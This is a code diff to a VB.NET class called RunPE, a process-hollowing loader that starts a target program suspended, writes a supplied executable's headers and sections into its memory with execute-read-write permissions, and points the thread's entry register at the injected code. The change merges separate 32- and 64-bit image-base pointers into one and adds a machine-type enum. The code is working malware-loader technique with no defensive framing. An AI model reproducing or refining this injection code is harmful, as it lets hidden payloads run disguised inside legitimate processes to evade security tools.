@@ -5,6 +5,12 @@ Public Class RunPE
     Public Const CREATE_SUSPENDED = &H4
     Const PE_POINTER_OFFSET As Integer = 60
     Const MACHINE_OFFSET As Integer = 4
+    Public Enum MachineType
+        Unknown = 0
+        x86 = &H14C
+        i64 = &H200
+        x64 = &H8664
+    End Enum
     Public Shared Function Start(lpBuffer() As Byte, targetexe As String) As Boolean
 
 
@@ -19,8 +25,7 @@ Public Class RunPE
         Dim PE_HEADER_ADDR As Integer = BitConverter.ToInt32(lpBuffer, PE_POINTER_OFFSET)
         Dim machineUint As Integer = BitConverter.ToUInt16(lpBuffer, PE_HEADER_ADDR + MACHINE_OFFSET)
 
-        Dim pImageBase32 As IntPtr
-        Dim pImageBase64 As UIntPtr
+        Dim pImageBase As IntPtr
         Dim ImageBase32 As UInteger
         Dim ImageBase64 As ULong
         Dim SizeOfImage As UInteger
@@ -28,10 +33,9 @@ Public Class RunPE
         Dim NumberOfSections As UShort
         Dim AddressOfEntryPoint As UInteger
         Dim nt_header_ptr As IntPtr = IntPtr.Add(baseAddress, dosHeader.e_lfanew)
-
         If machineUint = &H14C Then
             Dim ntHeaders32 As IMAGE_NT_HEADERS32 = Marshal.PtrToStructure(nt_header_ptr, GetType(IMAGE_NT_HEADERS32))
-            pImageBase32 = New IntPtr(ntHeaders32.OptionalHeader.ImageBase)
+            pImageBase = New IntPtr(ntHeaders32.OptionalHeader.ImageBase)
             ImageBase32 = ntHeaders32.OptionalHeader.ImageBase
             SizeOfImage = ntHeaders32.OptionalHeader.SizeOfImage
             SizeOfHeaders = ntHeaders32.OptionalHeader.SizeOfHeaders
@@ -39,7 +43,7 @@ Public Class RunPE
             AddressOfEntryPoint = ntHeaders32.OptionalHeader.AddressOfEntryPoint
         Else
             Dim ntHeaders64 As IMAGE_NT_HEADERS64 = Marshal.PtrToStructure(nt_header_ptr, GetType(IMAGE_NT_HEADERS64))
-            pImageBase64 = New UIntPtr(ntHeaders64.OptionalHeader.ImageBase)
+            pImageBase = New IntPtr(ntHeaders64.OptionalHeader.ImageBase)
             ImageBase64 = ntHeaders64.OptionalHeader.ImageBase
             SizeOfImage = ntHeaders64.OptionalHeader.SizeOfImage
             SizeOfHeaders = ntHeaders64.OptionalHeader.SizeOfHeaders
@@ -56,11 +60,11 @@ Public Class RunPE
         End If
         Dim hHandle = OpenProcess(PROCESS_ALL_ACCESS Or PROCESS_VM_OPERATION Or PROCESS_VM_READ Or PROCESS_VM_WRITE, False, pi.dwProcessId)
 
-        If VirtualAllocEx(hHandle, pImageBase32, SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE) = IntPtr.Zero Then
+        If VirtualAllocEx(hHandle, pImageBase, SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE) = IntPtr.Zero Then
             GoTo retexit
         End If
 
-        If Not WriteProcessMemory(hHandle, pImageBase32, baseAddress, SizeOfHeaders, IntPtr.Zero) Then
+        If Not WriteProcessMemory(hHandle, pImageBase, baseAddress, SizeOfHeaders, IntPtr.Zero) Then
             GoTo retexit
         End If
 
@@ -68,7 +72,7 @@ Public Class RunPE
             For i = 0 To NumberOfSections - 1
                 Dim imageSectionPtr As IntPtr = IntPtr.Add(baseAddress, dosHeader.e_lfanew + Marshal.SizeOf(New IMAGE_NT_HEADERS32) + i * Marshal.SizeOf(New IMAGE_SECTION_HEADER))
                 Dim section As IMAGE_SECTION_HEADER = Marshal.PtrToStructure(imageSectionPtr, GetType(IMAGE_SECTION_HEADER))
-                If Not WriteProcessMemory(hHandle, IntPtr.Add(pImageBase32, section.VirtualAddress), IntPtr.Add(baseAddress, section.PointerToRawData), section.SizeOfRawData, IntPtr.Zero) Then
+                If Not WriteProcessMemory(hHandle, IntPtr.Add(pImageBase, section.VirtualAddress), IntPtr.Add(baseAddress, section.PointerToRawData), section.SizeOfRawData, IntPtr.Zero) Then
                     GoTo retexit
                 End If
             Next
@@ -76,7 +80,7 @@ Public Class RunPE
             For i = 0 To NumberOfSections - 1
                 Dim imageSectionPtr As IntPtr = IntPtr.Add(baseAddress, dosHeader.e_lfanew + Marshal.SizeOf(New IMAGE_NT_HEADERS64) + i * Marshal.SizeOf(New IMAGE_SECTION_HEADER))
                 Dim section As IMAGE_SECTION_HEADER = Marshal.PtrToStructure(imageSectionPtr, GetType(IMAGE_SECTION_HEADER))
-                If Not WriteProcessMemory(hHandle, New IntPtr(CLng(CULng(UIntPtr.Add(pImageBase64, section.VirtualAddress)))), IntPtr.Add(baseAddress, section.PointerToRawData), section.SizeOfRawData, IntPtr.Zero) Then
+                If Not WriteProcessMemory(hHandle, IntPtr.Add(pImageBase, section.VirtualAddress), IntPtr.Add(baseAddress, section.PointerToRawData), section.SizeOfRawData, IntPtr.Zero) Then
                     GoTo retexit
                 End If
             Next
@@ -101,7 +105,7 @@ Public Class RunPE
                 GoTo retexit
             End If
             Marshal.FreeHGlobal(ptr)
-            context32.Eax = pImageBase32.ToInt64 + AddressOfEntryPoint
+            context32.Eax = pImageBase.ToInt64 + AddressOfEntryPoint
             If Not Wow64SetThreadContext32(pi.hThread, context32) Then
                 GoTo retexit
             End If
@@ -116,7 +120,7 @@ Public Class RunPE
                 GoTo retexit
             End If
             Marshal.FreeHGlobal(ptr)
-            context64.Rcx = pImageBase64 + AddressOfEntryPoint
+            context64.Rcx = pImageBase + AddressOfEntryPoint
             If Not Wow64SetThreadContext64(pi.hThread, context64) Then
                 GoTo retexit
             End If
